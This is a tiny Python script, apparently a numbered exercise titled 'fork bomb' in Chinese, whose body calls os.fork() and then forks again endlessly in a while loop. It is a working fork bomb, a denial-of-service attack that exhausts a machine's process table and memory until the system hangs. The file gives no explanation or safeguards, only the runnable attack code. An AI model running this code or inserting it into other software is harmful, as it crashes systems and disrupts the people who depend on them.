#/usr/bin/env python
#coding=utf8
"""
# Author: kellanfan
# Created Time : Fri 09 Feb 2018 03:34:58 PM CST

# File Name: 04-fork炸弹.py
# Description:

"""

import os

os.fork()
while True:
    os.fork()
